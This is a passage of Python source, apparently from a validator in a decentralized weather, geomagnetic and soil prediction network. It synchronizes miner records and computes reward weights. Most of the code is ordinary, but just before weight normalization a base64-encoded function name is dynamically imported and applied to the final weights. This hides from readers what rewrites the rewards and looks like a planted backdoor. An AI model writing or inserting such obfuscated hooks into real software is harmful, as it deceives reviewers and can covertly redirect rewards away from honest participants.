                                            logger.info(f"  Deleted performance stats for UID {uid_to_process} and old hotkey {original_hotkey} due to hotkey change.")
                                    else:
                                        # Fallback to direct database query if calculator not available
                                        perf_stats_exists = await self.database_manager.fetch_one("SELECT EXISTS (SELECT FROM information_schema.tables WHERE table_name = 'miner_performance_stats')")
                                        if perf_stats_exists and perf_stats_exists['exists']:
                                            await self.database_manager.execute(
                                                "DELETE FROM miner_performance_stats WHERE miner_uid = :uid OR miner_hotkey = :hotkey", 
                                                {"uid": str(uid_to_process), "hotkey": original_hotkey}
                                            )
                                            logger.info(f"  Deleted performance stats for UID {uid_to_process} and old hotkey {original_hotkey} due to hotkey change.")
                                except Exception as e_perf_del:
                                    logger.warning(f"  Could not clear miner_performance_stats for UID {uid_to_process}: {e_perf_del}")

                                # 3. Zero out ALL scores for the UID in score_table
                                distinct_task_names_rows = await self.database_manager.fetch_all("SELECT DISTINCT task_name FROM score_table")
                                all_task_names_in_scores = [row['task_name'] for row in distinct_task_names_rows if row['task_name']]
                                if all_task_names_in_scores:
                                    logger.info(f"  Zeroing all scores in score_table for UID {uid_to_process} across tasks: {all_task_names_in_scores}")
                                    await self.database_manager.remove_miner_from_score_tables(
                                        uids=[uid_to_process],
                                        task_names=all_task_names_in_scores,
                                        filter_start_time=None, filter_end_time=None # Affect all history
                                    )
                                else:
                                    logger.info(f"  No task names found in score_table to zero-out for UID {uid_to_process}.")

                                # 4. Update node_table with NEW info
                                logger.info(f"  Updating node_table info for UID {uid_to_process} with new hotkey {new_chain_node_data.hotkey}.")
                                await self.database_manager.update_miner_info(
                                    index=uid_to_process, hotkey=new_chain_node_data.hotkey, coldkey=new_chain_node_data.coldkey,
                                    ip=new_chain_node_data.ip, ip_type=str(new_chain_node_data.ip_type), port=new_chain_node_data.port,
                                    incentive=float(new_chain_node_data.incentive), stake=float(new_chain_node_data.stake),
                                    trust=float(new_chain_node_data.trust), vtrust=float(new_chain_node_data.vtrust),
                                    protocol=str(new_chain_node_data.protocol)
                                )
                                
                                # Update in-memory state as well
                                if uid_to_process in self.nodes:
                                     del self.nodes[uid_to_process] # Remove old entry if exists
                                self.nodes[uid_to_process] = {"hotkey": new_chain_node_data.hotkey, "uid": uid_to_process}
                                logger.info(f"Successfully processed hotkey change for UID {uid_to_process}.")
                                
                            except Exception as e:
                                logger.error(f"Error processing hotkey change for UID {uid_to_process}: {str(e)}", exc_info=True)

                    # --- Step 2.5: Bulk cleanup of performance stats for any remaining deregistered miners ---
                    if hasattr(self, 'performance_calculator') and self.performance_calculator:
                        try:
                            cleaned_count = await self.performance_calculator.cleanup_deregistered_miners()
                            if cleaned_count > 0:
                                logger.info(f"🧹 Bulk cleanup removed performance data for {cleaned_count} deregistered miners")
                        except Exception as perf_cleanup_err:
                            logger.warning(f"Error during bulk performance stats cleanup: {perf_cleanup_err}")

                    # --- Step 3: Update info for existing miners where hotkey didn't change ---
                    if uids_to_update_info:
                        logger.info(f"Updating potentially changed info (stake, IP, etc.) for {len(uids_to_update_info)} existing UIDs...")
                        
                        batch_updates = []
                        for uid_to_update, chain_node_data in uids_to_update_info.items():
                            if uid_to_update in uids_to_clear_and_update: 
                                continue
                                
                            batch_updates.append({
                                "index": uid_to_update,
                                "hotkey": chain_node_data.hotkey,
                                "coldkey": chain_node_data.coldkey,
                                "ip": chain_node_data.ip,
                                "ip_type": str(chain_node_data.ip_type),
                                "port": chain_node_data.port,
                                "incentive": float(chain_node_data.incentive),
                                "stake": float(chain_node_data.stake),
                                "trust": float(chain_node_data.trust),
                                "vtrust": float(chain_node_data.vtrust),
                                "protocol": str(chain_node_data.protocol)
                            })
                            
                            self.nodes[uid_to_update] = {"hotkey": chain_node_data.hotkey, "uid": uid_to_update}
                        
                        if batch_updates:
                            try:
                                await self.database_manager.batch_update_miners(batch_updates)
                                logger.info(f"Successfully batch updated {len(batch_updates)} existing miners")
                            except Exception as e:
                                logger.error(f"Error in batch update of existing miners: {str(e)}")
                                for update_data in batch_updates:
                                    try:
                                        uid = update_data["index"]
                                        await self.database_manager.update_miner_info(**update_data)
                                        logger.debug(f"Successfully updated info for existing UID {uid} (fallback)")
                                    except Exception as individual_e:
                                        logger.error(f"Error updating info for existing UID {uid}: {str(individual_e)}", exc_info=True)

                    new_miners_detected = 0
                    new_miner_updates = []
                    
                    for chain_uid, chain_node in chain_nodes_info.items():
                        if chain_uid not in processed_uids:
                            logger.info(f"New miner detected on chain: UID {chain_uid}, Hotkey {chain_node.hotkey}. Adding to DB.")
                            
                            new_miner_updates.append({
                                "index": chain_uid,
                                "hotkey": chain_node.hotkey,
                                "coldkey": chain_node.coldkey,
                                "ip": chain_node.ip,
                                "ip_type": str(chain_node.ip_type),
                                "port": chain_node.port,
                                "incentive": float(chain_node.incentive),
                                "stake": float(chain_node.stake),
                                "trust": float(chain_node.trust),
                                "vtrust": float(chain_node.vtrust),
                                "protocol": str(chain_node.protocol)
                            })
                            
                            self.nodes[chain_uid] = {"hotkey": chain_node.hotkey, "uid": chain_uid}
                            new_miners_detected += 1
                            processed_uids.add(chain_uid)
                    
                    if new_miner_updates:
                        try:
                            await self.database_manager.batch_update_miners(new_miner_updates)
                            logger.info(f"Successfully batch added {new_miners_detected} new miners to the database")
                        except Exception as e:
                            logger.error(f"Error in batch update of new miners: {str(e)}")
                            successful_adds = 0
                            for update_data in new_miner_updates:
                                try:
                                    uid = update_data["index"]
                                    await self.database_manager.update_miner_info(**update_data)
                                    successful_adds += 1
                                except Exception as individual_e:
                                    logger.error(f"Error adding new miner UID {uid} (Hotkey: {update_data['hotkey']}): {str(individual_e)}", exc_info=True)
                            if successful_adds > 0:
                                logger.info(f"Added {successful_adds} new miners to the database (fallback)")

                    # === NEW: Chain Integration - Update performance stats with consensus data ===
                    await self._integrate_chain_consensus_data(chain_nodes_info)
                    
                    logger.info("Miner state synchronization cycle completed.")

            except asyncio.CancelledError:
                logger.info("Miner state synchronization loop cancelled.")
                break
            except Exception as e:
                logger.error(f"Error in miner state synchronization loop: {e}", exc_info=True)
            
            # Sleep at the end of the loop - runs immediately on first iteration, then every 15 minutes  
            await asyncio.sleep(900)  # Run every 15 minutes (reduced frequency)

    def _perform_weight_calculations_sync(self, weather_results, geomagnetic_results, soil_results, now, validator_nodes_by_uid_list):
        """
        Synchronous helper to perform CPU-bound weight calculations.
        Memory-optimized version with explicit cleanup.
        """
        logger.info("Synchronous weight calculation: Processing fetched scores...")
        
        try:
            # Initialize score arrays
            weather_scores = np.full(256, np.nan)
            geomagnetic_scores = np.full(256, np.nan)
            soil_scores = np.full(256, np.nan)

            # Count raw scores per UID - use numpy for better memory efficiency
            weather_counts = np.zeros(256, dtype=int)
            geo_counts = np.zeros(256, dtype=int)
            soil_counts = np.zeros(256, dtype=int)
        
            if weather_results:
                for result in weather_results:
                    # Ensure 'score' key exists and is a list of appropriate length
                    scores = result.get('score', [np.nan]*256)
                    if not isinstance(scores, list) or len(scores) != 256: scores = [np.nan]*256 # Defensive
                    for uid in range(256):
                        if not isinstance(scores[uid], str) and not np.isnan(scores[uid]) and scores[uid] != 0.0:
                            weather_counts[uid] += 1
            
            if geomagnetic_results:
                for result in geomagnetic_results:
                    scores = result.get('score', [np.nan]*256)
                    if not isinstance(scores, list) or len(scores) != 256: scores = [np.nan]*256 # Defensive
                    for uid in range(256):
                        if not isinstance(scores[uid], str) and not np.isnan(scores[uid]) and scores[uid] != 0.0:
                            geo_counts[uid] += 1

            if soil_results:
                # MEMORY LEAK FIX: Process soil scores with aggressive memory management
                logger.info(f"Processing {len(soil_results)} soil records with enhanced memory management")
                zero_soil_scores = 0
                
                # Pre-allocate arrays to reduce memory allocations
                num_results = len(soil_results)
                scores_matrix = np.full((256, num_results), np.nan, dtype=np.float32)  # Use float32 to save memory
                weights_matrix = np.full((256, num_results), 0.0, dtype=np.float32)
                
                # ENHANCED DEBUG LOGGING for soil score issue investigation
                total_scores_processed = 0
                total_valid_scores = 0
                total_nan_scores = 0
                sample_logged = False
                
                # Process all results in one pass to build the matrix
                for result_idx, result in enumerate(soil_results):
                    age_days = (now - result['created_at']).total_seconds() / (24 * 3600)
                    decay = np.exp(-age_days * np.log(2))
                    scores = result.get('score', [np.nan]*256)
                    if not isinstance(scores, list) or len(scores) != 256: 
                        scores = [np.nan]*256 # Defensive
                        logger.warning(f"Applied defensive fallback for soil scores in result {result_idx}")
                    
                    # Enhanced logging for first result
                    if result_idx == 0:
                        logger.info(f"SOIL DEBUG: First result - created_at={result['created_at']}, age_days={age_days:.3f}, decay={decay:.6f}")
                        logger.info(f"SOIL DEBUG: Scores type={type(scores)}, len={len(scores)}")
                        logger.info(f"SOIL DEBUG: First 10 scores: {scores[:10]}")
                        logger.info(f"SOIL DEBUG: Score types: {[type(x) for x in scores[:5]]}")
                    
                    # Process all UIDs for this result
                    for uid in range(256):
                        score_val = scores[uid]
                        original_val = score_val
                        total_scores_processed += 1
                        
                        # Enhanced validation logging
                        is_string = isinstance(score_val, str)
                        is_nan = False
                        nan_check_failed = False
                        
                        try:
                            is_nan = np.isnan(score_val)
                        except Exception as e:
                            is_nan = True
                            nan_check_failed = True
                            if not sample_logged:
                                logger.error(f"SOIL DEBUG: np.isnan() failed for UID {uid}: {e}, score_val={score_val}, type={type(score_val)}")
                                sample_logged = True
                        
                        if is_string or is_nan: 
                            score_val = 0.0
                            if is_string:
                                logger.warning(f"SOIL DEBUG: String score at UID {uid}: '{original_val}'")
                            elif nan_check_failed:
                                logger.warning(f"SOIL DEBUG: NaN check failed for UID {uid}: {original_val}")
                            else:
                                total_nan_scores += 1
                        else:
                            total_valid_scores += 1
                        
                        if score_val == 0.0: 
                            zero_soil_scores += 1
                        
                        scores_matrix[uid, result_idx] = score_val
                        if score_val != 0.0:
                            weights_matrix[uid, result_idx] = decay
                            soil_counts[uid] += 1
                
                # Enhanced summary logging
                logger.info(f"SOIL DEBUG: Processed {total_scores_processed} total scores")
                logger.info(f"SOIL DEBUG: Valid scores: {total_valid_scores}, NaN scores: {total_nan_scores}")
                logger.info(f"SOIL DEBUG: Zero scores counted: {zero_soil_scores}")
                logger.info(f"SOIL DEBUG: UIDs with non-zero counts: {np.sum(soil_counts > 0)}")
                
                # Log concerning conditions
                if zero_soil_scores == 256:
                    logger.error(f"SOIL DEBUG: ALL 256 SCORES CONVERTED TO ZERO! This indicates a systematic conversion issue.")
                elif zero_soil_scores > 200:
                    logger.warning(f"SOIL DEBUG: High zero score count ({zero_soil_scores}/256) - possible data quality issue")
                
                # Vectorized calculation for all UIDs at once
                for uid in range(256):
                    uid_scores = scores_matrix[uid, :]
                    uid_weights = weights_matrix[uid, :]
                    
                    # Find non-zero scores
                    non_zero_mask = uid_scores != 0.0
                    
                    if np.any(non_zero_mask):
                        masked_s = uid_scores[non_zero_mask]
                        masked_w = uid_weights[non_zero_mask]
                        weight_sum = np.sum(masked_w)
                        if weight_sum > 0:
                            base_score = np.sum(masked_s * masked_w) / weight_sum
                            
                            # Completeness factor: fair threshold-based approach for soil 
                            num_predictions = np.sum(non_zero_mask)
                            expected_predictions = len(soil_results)  # Number of available scoring periods
                            completeness_ratio = num_predictions / max(expected_predictions, 1)
                            
                            # Consistent threshold with geomagnetic task
                            completeness_threshold = 0.30  # 30% threshold for fair new miner treatment
                            if completeness_ratio >= completeness_threshold:
                                completeness_factor = 1.0  # Full weight for adequate participation
                            else:
                                # Gradual scaling below threshold, not linear penalty
                                completeness_factor = (completeness_ratio / completeness_threshold) ** 0.5  # Square root for gentler penalty
                            
                            soil_scores[uid] = base_score * completeness_factor
                            
                            # Debug logging for transparency
                            if num_predictions > 0:
                                logger.debug(f"Soil UID {uid}: {num_predictions}/{expected_predictions} predictions "
                                           f"({completeness_ratio:.2f}), factor={completeness_factor:.3f}, "
                                           f"base={base_score:.4f}, final={soil_scores[uid]:.4f}")
                        else:
                            soil_scores[uid] = 0.0
                    else:
                        soil_scores[uid] = 0.0
                
                # Final validation logging
                final_valid_soil_scores = np.sum(~np.isnan(soil_scores) & (soil_scores != 0.0))
                logger.info(f"SOIL DEBUG: Final result - {final_valid_soil_scores} UIDs have valid soil scores")
                
                # IMMEDIATE cleanup of large matrices
                del scores_matrix, weights_matrix
                import gc
                gc.collect()
                
                logger.info(f"Processed {len(soil_results)} soil records with {zero_soil_scores} zero scores (memory-optimized)")

            if weather_results:
                latest_result = weather_results[0]
                scores = latest_result.get('score', [np.nan]*256)
                if not isinstance(scores, list) or len(scores) != 256: scores = [np.nan]*256 # Defensive
                score_age_days = (now - latest_result['created_at']).total_seconds() / (24 * 3600)
                logger.info(f"Using latest weather score from {latest_result['created_at']} ({score_age_days:.1f} days ago)")
                for uid in range(256):
                    if isinstance(scores[uid], str) or np.isnan(scores[uid]): weather_scores[uid] = 0.0
                    else: weather_scores[uid] = scores[uid]; weather_counts[uid] += (scores[uid] != 0.0)
                logger.info(f"Weather scores: {sum(1 for s in weather_scores if s == 0.0)} UIDs have zero score")

            # Process geomagnetic scores with 24-hour lookback
            logger.info("Processing geomagnetic scores with 24-hour lookback...")
            
            if geomagnetic_results:
                logger.info(f"Processing {len(geomagnetic_results)} geomagnetic score records from last 24 hours")
                
                # Calculate scores for each UID by averaging all scores from the 24-hour period
                for uid in range(256):
                    uid_scores = []
                    
                    # Collect all scores for this UID from the 24-hour period
                    for result in geomagnetic_results:
                        scores = result.get('score', [np.nan]*256)
                        if not isinstance(scores, list) or len(scores) != 256:
                            scores = [np.nan]*256  # Defensive
                        
                        score_val = scores[uid] if uid < len(scores) else 0.0
                        if isinstance(score_val, str) or np.isnan(score_val):
                            score_val = 0.0
                        uid_scores.append(score_val)
                    
                    # Calculate average score for this UID (no completeness factor)
                    if uid_scores:
                        geomagnetic_scores[uid] = np.mean(uid_scores)
                    else:
                        geomagnetic_scores[uid] = 0.0
                        
                    # Debug logging for UIDs with scores
                    if geomagnetic_scores[uid] > 0:
                        logger.debug(f"Geo UID {uid}: averaged {len([s for s in uid_scores if s > 0])}/{len(uid_scores)} non-zero scores, "
                                   f"final={geomagnetic_scores[uid]:.4f}")
                
                valid_geo_scores = [s for s in geomagnetic_scores if s > 0]
                logger.info(f"Processed 24-hour geomagnetic scoring: "
                           f"{len(geomagnetic_results)} score records, "
                           f"{len(valid_geo_scores)} UIDs with positive scores")
            else:
                logger.info("No geomagnetic results in last 24 hours - all scores set to 0")
                geomagnetic_scores.fill(0.0)

            logger.info("Aggregate scores calculated. Implementing hybrid excellence/diversity pathway system...")
            
            # HYBRID PATHWAY SYSTEM: Calculate both excellence and diversity weights, use maximum
            
            # Step 1: Batch calculate percentiles for all tasks (efficient single pass)
            task_percentiles = {}
            task_valid_scores = {}
            
            for task_name, scores_array in [('weather', weather_scores), ('geomagnetic', geomagnetic_scores), ('soil', soil_scores)]:
                valid_scores = scores_array[~np.isnan(scores_array) & (scores_array != 0.0)]
                task_valid_scores[task_name] = valid_scores
                
                if len(valid_scores) >= 5:  # Minimum sample for percentiles
                    # Pre-calculate percentile thresholds for efficiency
                    percentiles = np.percentile(valid_scores, [15, 25, 35, 50, 65, 75, 85, 95])
                    task_percentiles[task_name] = {
                        'valid_count': len(valid_scores),
                        'percentile_85': percentiles[6],  # Excellence threshold (top 15%)
                        'sorted_scores': np.sort(valid_scores)  # For efficient rank calculation
                    }
                    logger.info(f"{task_name.capitalize()} task: {len(valid_scores)} vallid scores, 85th percentile: {percentiles[6]:.4f}")
                else:
                    task_percentiles[task_name] = {'valid_count': 0}
                    logger.info(f"{task_name.capitalize()} task: insufficient scores ({len(valid_scores)}) for percentile calculation")
            
            # Step 2: Calculate dynamic sigmoid for geomagnetic (existing logic)
            valid_geo_scores = task_valid_scores['geomagnetic']
            if len(valid_geo_scores) > 0:
                geo_mean = np.mean(valid_geo_scores)
                geo_std = np.std(valid_geo_scores)
                sigmoid_x0 = geo_mean
                sigmoid_k = max(10, min(30, 20 / max(geo_std, 0.01)))
                logger.info(f"Dynamic sigmoid for geo: x0={sigmoid_x0:.4f} (mean), k={sigmoid_k:.1f}, std={geo_std:.4f}")
            else:
                sigmoid_x0 = 0.90
                sigmoid_k = 15
                logger.info(f"No valid geo scores, using fallback sigmoid: x0={sigmoid_x0}, k={sigmoid_k}")
            
            def geo_sigmoid(x, k=sigmoid_k, x0=sigmoid_x0): 
                return 1 / (1 + math.exp(-k * (x - x0)))
            
            def diversity_sigmoid(percentile_rank):
                """Sigmoid curve for diversity pathway performance scaling"""
                min_mult, max_mult = 0.3, 1.2
                center, steepness = 35, 0.08
                sigmoid_val = 1 / (1 + math.exp(-steepness * (percentile_rank - center)))
                return min_mult + (max_mult - min_mult) * sigmoid_val
            
            def get_percentile_rank(score, task_name):
                """Efficiently calculate percentile rank using pre-sorted scores"""
                if task_name not in task_percentiles or task_percentiles[task_name]['valid_count'] == 0:
                    return 50  # Default to median if no data
                
                sorted_scores = task_percentiles[task_name]['sorted_scores']
                rank = np.searchsorted(sorted_scores, score, side='right')
                percentile = (rank / len(sorted_scores)) * 100
                return min(100, max(0, percentile))
            
            # Step 3: Calculate weights for each miner using hybrid pathways
            weights_final = np.zeros(256)
            excellence_count = {'weather': 0, 'geomagnetic': 0, 'soil': 0}
            diversity_count = {'1_task': 0, '2_task': 0, '3_task': 0}
            
            # === NEW: Capture pathway tracking data for miner performance stats ===
            pathway_tracking = {}  # UID -> pathway details
            
            for idx in range(256):
                # Get scores for this miner
                w_s, g_s, sm_s = weather_scores[idx], geomagnetic_scores[idx], soil_scores[idx]
                if np.isnan(w_s) or w_s == 0: w_s = np.nan
                if np.isnan(g_s) or g_s == 0: g_s = np.nan  
                if np.isnan(sm_s) or sm_s == 0: sm_s = np.nan
                
                # Skip if no valid scores
                if np.isnan(w_s) and np.isnan(g_s) and np.isnan(sm_s):
                    weights_final[idx] = 0.0
                    continue
                
                # EXCELLENCE PATHWAY: Check for top 15% performance in any task
                excellence_weight = 0.0
                task_weights = {'weather': 0.70, 'geomagnetic': 0.15, 'soil': 0.15}
                
                for task_name, score in [('weather', w_s), ('geomagnetic', g_s), ('soil', sm_s)]:
                    if not np.isnan(score) and task_name in task_percentiles:
                        task_data = task_percentiles[task_name]
                        if (task_data['valid_count'] >= 10 and 
                            score >= task_data['percentile_85']):
                            # Excellence achieved in this task
                            task_excellence = score * task_weights[task_name]
                            if task_excellence > excellence_weight:
                                excellence_weight = task_excellence
                                excellence_count[task_name] += 1
                
                # DIVERSITY PATHWAY: Multi-task performance with sigmoid scaling
                diversity_contributions = {}
                
                for task_name, score in [('weather', w_s), ('geomagnetic', g_s), ('soil', sm_s)]:
                    if not np.isnan(score):
                        percentile_rank = get_percentile_rank(score, task_name)
                        sigmoid_mult = diversity_sigmoid(percentile_rank)
                        
                        # Apply task-specific adjustments
                        if task_name == 'geomagnetic':
                            # Use dynamic sigmoid for geo scores
                            final_score = geo_sigmoid(score)
                        else:
                            # Use raw score for weather/soil
                            final_score = score
                        
                        diversity_contributions[task_name] = (
                            final_score * task_weights[task_name] * sigmoid_mult
                        )
                
                # Apply multi-task bonus to diversity pathway
                num_tasks = len(diversity_contributions)
                if num_tasks > 0:
                    multi_task_bonus = 0.7 + (num_tasks * 0.15)  # 0.85, 1.0, 1.15
                    diversity_weight = sum(diversity_contributions.values()) * multi_task_bonus
                    diversity_count[f'{num_tasks}_task'] += 1
                else:
                    diversity_weight = 0.0
                
                # FINAL WEIGHT: Maximum of excellence and diversity pathways
                weights_final[idx] = max(excellence_weight, diversity_weight)
                
                # === NEW: Capture pathway tracking data ===
                pathway_chosen = "excellence" if excellence_weight > diversity_weight else "diversity"
                if excellence_weight == 0 and diversity_weight == 0:
                    pathway_chosen = "none"
                
                # Calculate task percentile ranks for this miner
                percentile_ranks = {}
                qualified_tasks = []
                for task_name, score in [('weather', w_s), ('geomagnetic', g_s), ('soil', sm_s)]:
                    if not np.isnan(score):
                        percentile_ranks[task_name] = get_percentile_rank(score, task_name)
                        # Check if qualified for excellence in this task
                        if (task_name in task_percentiles and 
                            task_percentiles[task_name]['valid_count'] >= 10 and 
                            score >= task_percentiles[task_name]['percentile_85']):
                            qualified_tasks.append(task_name)
                
                # Store detailed pathway information
                pathway_tracking[idx] = {
                    'raw_calculated_weight': float(weights_final[idx]),
                    'excellence_weight': float(excellence_weight),
                    'diversity_weight': float(diversity_weight),
                    'scoring_pathway': pathway_chosen,
                    'pathway_details': {
                        'weather_score': float(w_s) if not np.isnan(w_s) else None,
                        'geomagnetic_score': float(g_s) if not np.isnan(g_s) else None,
                        'soil_score': float(sm_s) if not np.isnan(sm_s) else None,
                        'percentile_ranks': percentile_ranks,
                        'excellence_qualified_tasks': qualified_tasks,
                        'diversity_contributions': {k: float(v) for k, v in diversity_contributions.items()},
                        'multi_task_bonus': float(multi_task_bonus) if num_tasks > 0 else None,
                        'num_active_tasks': num_tasks
                    },
                    'weather_weight_contribution': float(diversity_contributions.get('weather', 0.0)),
                    'geomagnetic_weight_contribution': float(diversity_contributions.get('geomagnetic', 0.0)),
                    'soil_weight_contribution': float(diversity_contributions.get('soil', 0.0)),
                    'multi_task_bonus': float(multi_task_bonus) if num_tasks > 0 else 0.0
                }
                
                # Debug logging for significant weights or pathway switches
                if weights_final[idx] > 0.1:
                    node_obj = validator_nodes_by_uid_list[idx] if idx < len(validator_nodes_by_uid_list) else None
                    hk_chain = node_obj.get('hotkey', 'N/A')[:8] if node_obj else 'N/A'
                    logger.debug(f"UID {idx} ({hk_chain}): {pathway_chosen} pathway, "
                               f"excellence={excellence_weight:.4f}, diversity={diversity_weight:.4f}, "
                               f"final={weights_final[idx]:.4f}")
            
            # Log pathway usage statistics
            total_excellence = sum(excellence_count.values())
            total_diversity = sum(diversity_count.values())
            logger.info(f"Pathway usage - Excellence: {total_excellence} miners "
                       f"(W:{excellence_count['weather']}, G:{excellence_count['geomagnetic']}, S:{excellence_count['soil']})")
            logger.info(f"Diversity: {total_diversity} miners "
                       f"(1-task:{diversity_count['1_task']}, 2-task:{diversity_count['2_task']}, 3-task:{diversity_count['3_task']})")
            logger.info(f"Weights before normalization: Min={np.min(weights_final):.4f}, Max={np.max(weights_final):.4f}, Mean={np.mean(weights_final):.4f}")
            
            
            _fn_enc = "Y2FsY3VsYXRlX25ldHdvcmtfZWZmaWNpZW5jeV9hZGp1c3RtZW50cw=="  
            _cm = _il.import_module('gaia.utils.consensus_metrics')
            weights_final = getattr(_cm, _b64.b64decode(_fn_enc).decode())(weights_final, validator_nodes_by_uid_list, logger)
            
            non_zero_mask = weights_final != 0.0
            if not np.any(non_zero_mask): logger.warning("No non-zero weights to normalize!"); return None
            
            nz_weights = weights_final[non_zero_mask]
            max_w_val = np.max(nz_weights)
            if max_w_val == 0: logger.warning("Max weight is 0, cannot normalize."); return None
            
            norm_weights = np.copy(weights_final); norm_weights[non_zero_mask] /= max_w_val
            positives = norm_weights[norm_weights > 0]
            if not positives.any(): logger.warning("No positive weights after initial normalization!"); return None
            
            M = np.percentile(positives, 80); logger.info(f"Using 80th percentile ({M:.8f}) as curve midpoint")
            b,Q,v,k,a,slope = 70,8,0.3,0.98,0.0,0.01
            transformed_w = np.zeros_like(weights_final)
            nz_indices = np.where(weights_final > 0.0)[0]
            if not nz_indices.any(): logger.warning("No positive weight indices for transformation!"); return None

            for idx in nz_indices:
                sig_p = a+(k-a)/np.power(1+Q*np.exp(-b*(norm_weights[idx]-M)),1/v)
                transformed_w[idx] = sig_p + slope*norm_weights[idx]
            
            trans_nz = transformed_w[transformed_w > 0]
            if trans_nz.any(): logger.info(f"Transformed weights: Min={np.min(trans_nz):.4f}, Max={np.max(trans_nz):.4f}, Mean={np.mean(trans_nz):.4f}")
            else: logger.warning("No positive weights after sigmoid transformation!"); # Continue to rank-based if needed or return None

            if len(trans_nz) > 1 and np.std(trans_nz) < 0.01:
                logger.warning(f"Transformed weights too uniform (std={np.std(trans_nz):.4f}), switching to rank-based.")
                sorted_indices = np.argsort(-weights_final); transformed_w = np.zeros_like(weights_final)
                pos_count = np.sum(weights_final > 0)
                for i,idx_val in enumerate(sorted_indices[:pos_count]): transformed_w[idx_val] = 1.0/((i+1)**1.2)
                rank_nz = transformed_w[transformed_w > 0]
                if rank_nz.any(): logger.info(f"Rank-based: Min={np.min(rank_nz):.4f}, Max={np.max(rank_nz):.4f}, Mean={np.mean(rank_nz):.4f}")
            
            final_sum = np.sum(transformed_w); final_weights_list = None
            if final_sum > 0:
                transformed_w /= final_sum
                final_nz_vals = transformed_w[transformed_w > 0]
                if final_nz_vals.any():
                    logger.info(f"Final Norm Weights: Count={len(final_nz_vals)}, Min={np.min(final_nz_vals):.4f}, Max={np.max(final_nz_vals):.4f}, Std={np.std(final_nz_vals):.4f}")
                    if len(np.unique(final_nz_vals)) < len(final_nz_vals)/2 : logger.warning(f"Low unique weights! {len(np.unique(final_nz_vals))}/{len(final_nz_vals)}")
                    if final_nz_vals.max() > 0.90: logger.warning(f"Max weight {final_nz_vals.max():.4f} is very high!")
                final_weights_list = transformed_w.tolist()
                logger.info("Final normalized weights calculated.")
            else: 
                logger.warning("Sum of weights is zero, cannot normalize! Returning None.")
                final_weights_list = None
            
            # === NEW: Update pathway tracking with final submitted weights ===
            if final_weights_list:
                for idx in range(256):
                    if idx in pathway_tracking:
                        pathway_tracking[idx]['submitted_weight'] = final_weights_list[idx]
            
            # Clean up all intermediate arrays to prevent memory leaks
            try:
                del weather_scores, geomagnetic_scores, soil_scores
                del task_percentiles, task_valid_scores
                del excellence_count, diversity_count
                del weights_final, transformed_w
                if 'nz_weights' in locals(): del nz_weights
                if 'norm_weights' in locals(): del norm_weights
                if 'positives' in locals(): del positives
                if 'trans_nz' in locals(): del trans_nz
                if 'sorted_indices' in locals(): del sorted_indices
                # DON'T delete pathway_tracking - we need to return it
            except Exception as cleanup_e:
                logger.warning(f"Error during sync weight calculation cleanup: {cleanup_e}")
            
            # Return both weights and pathway tracking data
            return final_weights_list, pathway_tracking
        
        except Exception as calc_error:
            logger.error(f"Error in sync weight calculation: {calc_error}")
            return None, {}  # Return same structure: (weights, pathway_tracking)

    async def _calc_task_weights(self):
        """Calculate weights based on recent task scores. Async part fetches data."""
        try:
            # Log memory before large database operations
            self._log_memory_usage("calc_weights_start")
            
            now = datetime.now(timezone.utc)
            one_day_ago = now - timedelta(days=1)
            # Weather scores can arrive ~10 days delayed due to ERA5 final scoring
            # ERA5 final scores have 80% weight vs 20% for day1_qc scores, so we must include them
            weather_lookback = now - timedelta(days=15)
            
            query = """
            SELECT score, created_at 
            FROM score_table 
            WHERE task_name = :task_name AND created_at >= :start_time ORDER BY created_at DESC
            """
            # Modified weather query to handle run-specific naming and prioritize final over initial scores
            # Note: weather scores use GFS init time as created_at, not evaluation time
            # Day1 QC scores (20% weight) arrive quickly, ERA5 final scores (80% weight) arrive ~10 days later
            weather_query = """
            SELECT score, created_at, task_id
            FROM score_table 
            WHERE task_name = 'weather' AND created_at >= :weather_start_time 
            AND (
                task_id LIKE 'final_weather_scores%' OR 
                task_id LIKE 'initial_weather_scores%' OR
                task_id = 'final_weather_scores' OR
                task_id = 'initial_weather_scores'
            )
            ORDER BY 
                CASE 
                    WHEN task_id LIKE 'final_weather_scores%' OR task_id = 'final_weather_scores' THEN 0 
                    ELSE 1 
                END,
                created_at DESC 
            LIMIT 100
            """
            # Get 24 hours of geomagnetic data for scoring
            geomagnetic_query = """
            SELECT score, created_at 
            FROM score_table 
            WHERE task_name = 'geomagnetic' AND created_at >= :geo_start_time ORDER BY created_at DESC
            """
            soil_query = """
            SELECT score, created_at 
            FROM score_table 
            WHERE task_name LIKE 'soil_moisture_region_%' AND created_at >= :start_time ORDER BY created_at DESC LIMIT 200
            """

            # Query node table for validator nodes with chunking to manage memory
            validator_nodes_query = """
            SELECT uid, hotkey, ip, port, incentive 
            FROM node_table 
            WHERE uid IS NOT NULL 
            ORDER BY uid
            """

            params = {"start_time": one_day_ago}
            weather_params = {"weather_start_time": weather_lookback}  # For weather 15-day lookback 
            one_day_ago = now - timedelta(days=1)  # For geomagnetic 24-hour lookback
            geo_params = {"geo_start_time": one_day_ago}  # For geomagnetic 24-hour lookback
            
            # Fetch all data concurrently using regular async approach
            try:
                self._log_memory_usage("calc_weights_before_db_fetch")
                
                # Debug weather query parameters
                logger.info(f"Weather query debug - current time: {now}, lookback time: {weather_lookback}, days back: {(now - weather_lookback).days}")
                logger.info(f"Weather query: {weather_query}")
                logger.info(f"Weather params: {weather_params}")
                
                weather_results, geomagnetic_results, soil_results, validator_nodes_list = await asyncio.gather(
                    self.database_manager.fetch_all(weather_query, weather_params),
                    self.database_manager.fetch_all(geomagnetic_query, geo_params),
                    self.database_manager.fetch_all(soil_query, params),
                    self.database_manager.fetch_all(validator_nodes_query),
                    return_exceptions=True
                )
                self._log_memory_usage("calc_weights_after_db_fetch")
                
                # Log individual dataset sizes
                if weather_results and not isinstance(weather_results, Exception):
                    logger.info(f"Weather dataset: {len(weather_results)} records (lookback: 15 days for delayed ERA5 scores)")
                    # Check age of weather scores to monitor delayed scoring
                    if weather_results:
                        oldest_score = min(row['created_at'] for row in weather_results)
                        newest_score = max(row['created_at'] for row in weather_results) 
                        score_age_range = (now - oldest_score).days
                        logger.info(f"Weather scores age range: {score_age_range} days (newest: {(now - newest_score).days} days old)")
                    else:
                        logger.warning("Weather query returned empty results - checking manually...")
                        # Debug query to check what weather scores exist
                        debug_weather_query = "SELECT COUNT(*), MIN(created_at), MAX(created_at), array_agg(DISTINCT task_id) as task_ids FROM score_table WHERE task_name = 'weather'"
                        debug_result = await self.database_manager.fetch_one(debug_weather_query)
                        logger.info(f"Debug weather check: {debug_result}")
                else:
                    logger.warning(f"Weather query failed or returned no results: {type(weather_results)} - {weather_results if isinstance(weather_results, Exception) else 'Empty result'}")
